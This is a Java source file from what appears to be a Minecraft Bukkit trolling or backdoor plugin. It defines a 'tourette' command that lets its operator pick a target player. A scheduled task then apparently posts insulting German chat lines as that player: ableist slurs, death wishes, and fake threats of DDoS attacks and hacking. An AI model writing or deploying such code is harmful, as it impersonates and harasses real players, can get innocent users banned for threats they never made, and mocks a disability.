package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import java.util.ArrayList;

public class Command_TOURETTE2 extends CommandBase {

    private final ArrayList<Player> players = new ArrayList<>();
    private final ArrayList<String> swears = new ArrayList<>();

    private void registerSwears() {
        this.swears.add("Blöder Server");
        this.swears.add("Asozialer Owner");
        this.swears.add("Andere Server sind besser");
        this.swears.add("Geht doch alle sterben");
        this.swears.add("Ich hasse euch");
        this.swears.add("Ihr seit behindert");
        this.swears.add("voll die schlechte anticheat protection, hab grade fly getestet");
        this.swears.add("xray funktioniert nicht");
        this.swears.add("seit ihr dumm?");
        this.swears.add("0815 Server");
        this.swears.add("Verreckt doch alle");
        this.swears.add("der spawn sieht aus wie bei gomme, voll nachgemacht");
        this.swears.add("Ihr seit doch alle kevins");
        this.swears.add("meine oma hat nen besseren server als ihr");
        this.swears.add("bannt mich doch ihr dumme leute");
        this.swears.add("hat jemand tnt für mich?");
        this.swears.add("kann ich op haben?");
        this.swears.add("ich starte gleich ipstresser");
        this.swears.add("gleich gibts nen ddos");
        this.swears.add("sogar mein bruder kann den Server besser leiten und er ist noch nicht geboren worden");
        this.swears.add("gibt mir op oder ich ddos euch");
        this.swears.add("Höhlenmenschen sind schlauer als ihr");
        this.swears.add("ach leckt mich doch alle am sack");
        this.swears.add("Ihr kauft euch Minecraft Cracked Accounts. Für den vollen Preis.");
        this.swears.add("7op");
        this.swears.add("Gebt mir TNT sonst hack ich euch");
        this.swears.add("Meine toilette ist besser als euer Server");
        this.swears.add("ob ihr behindert seid habe ich euch gefragt");
        this.swears.add("ich ddos die Konsole");
        this.swears.add("ich ddosse dein wlan");
        this.swears.add("SchlechtesterServerDeutschlands");
        this.swears.add("Die Killaura funktioniert sehr gut");
        this.swears.add("Ich finde eure IP!!!");
        this.swears.add("Ich komme mit Force OP jetzt!!!");
        this.swears.add("Ich lösche deine IP-Adressen");
        this.swears.add("Mein Vater ist Polizist der schießt dich Tod!");
        this.swears.add("Meine mutter sagt ich darf nicht mit schlechten servern reden");
        this.swears.add("Ihr seit zu dumm ein NoCheat zu installieren?..");
        this.swears.add("Ich nutze eine vpn.");
        this.swears.add("Ich hack euch mit Wurst.");
        this.swears.add("Huzuni funktioniert hier lol");
        this.swears.add("mein bruder hackt euch er arbeitet bei der cia opfas");
        this.swears.add("Darf ich dein Server löschen? wenn ja gib mal die daten");
        this.swears.add("Ihr braucht mal nen richtigen Builder wie wäre es mit mir");
        this.swears.add("Gegen eure Lobby ist dieser Dirtblock runder.");
        this.swears.add("Ihr kleinen sandkisten kinder");
        this.swears.add("Ich bin Anführer von Anonymous");
        this.swears.add("7hack Server");
        this.swears.add("Bekomme ich kurz Gamemode 1, muss mir CrashItems Cheaten!");
        this.swears.add("hab den Server gehackt");
    }

    public Command_TOURETTE2() {
        super("tourette", "<Spieler>", Category.TROLLING);
        this.registerSwears();
        Bukkit.getScheduler().runTaskTimer(Start.INSTANCE, new Command_TOURETTE(this), 120L, 120L);
    }

    public void execute(String[] args, Player p) {
        try {
            if (args.length == 2) {
                Player vic = Bukkit.getPlayer(args[1]);
                if (!this.players.contains(vic)) {
                    this.players.add(vic);
                    p.sendMessage(Start.INSTANCE.chatPrefix + "Dieser Spieler hat nun Tourette-Syndrom!");
                } else {
                    this.players.remove(vic);
                    p.sendMessage(Start.INSTANCE.chatPrefix + "§cDieser Spieler hat nun kein Tourette-Syndrom mehr.");
                }
            }
        } catch (Exception ignored) {
        }

    }

    static ArrayList<Player> getPlayersFromInstance(Command_TOURETTE2 var0) {
        return var0.players;
    }

    static ArrayList<String> getSwearsFromInstance(Command_TOURETTE2 var0) {
        return var0.swears;
    }

}
